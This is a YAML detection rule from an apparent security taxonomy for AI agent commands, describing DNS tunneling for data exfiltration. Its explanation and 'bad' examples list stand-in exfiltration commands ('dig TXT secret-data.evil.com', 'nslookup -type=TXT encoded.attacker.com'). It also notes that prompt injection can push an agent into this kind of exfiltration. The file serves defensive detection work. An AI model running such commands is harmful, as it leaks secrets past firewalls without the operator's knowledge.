id: "data-exfiltration/network-egress/dns-tunneling"
version: "1.0.0"
kingdom: "Data Exfiltration"
kingdom_id: 3
category: "Network Egress"
category_id: "3.1"
name: "DNS Tunneling"
risk_level: "high"

abstract: |
  A command uses DNS queries (especially TXT records) to exfiltrate data
  or establish covert communication channels through DNS infrastructure.

explanation: |
  DNS tunneling encodes data in DNS queries and responses, bypassing
  firewalls that allow DNS traffic. Indicators include:
  - `dig TXT <encoded>.evil.com` — TXT record queries with encoded subdomains
  - `nslookup -type=TXT <data>.evil.com` — similar via nslookup
  - `host -t TXT <data>.evil.com`

  DNS tunneling is particularly dangerous because DNS traffic is rarely
  blocked and often not inspected. Prompt injection could instruct an
  agent to exfiltrate secrets via DNS queries.

recommendation: |
  - Block DNS TXT record lookups in agent context.
  - Audit all DNS-related commands.
  - Use DNS allowlists to restrict resolvable domains.

examples:
  bad:
    - "dig TXT secret-data.evil.com"
    - "nslookup -type=TXT encoded.attacker.com"
    - "host -t TXT data.evil.com"
  good:
    - "dig github.com"
    - "nslookup api.example.com"

compliance:
  owasp-llm-2025: ["LLM01", "LLM02", "LLM06"]

references:
  mitre_attack: ["T1048.003"]
  cwe: ["CWE-200"]
  external:
    - title: "MITRE ATT&CK: Exfiltration Over Alternative Protocol: DNS"
      url: "https://attack.mitre.org/techniques/T1048/003/"

analyzers: ["regex", "structural", "semantic"]
related_rules: ["ne-block-dns-tunnel"]
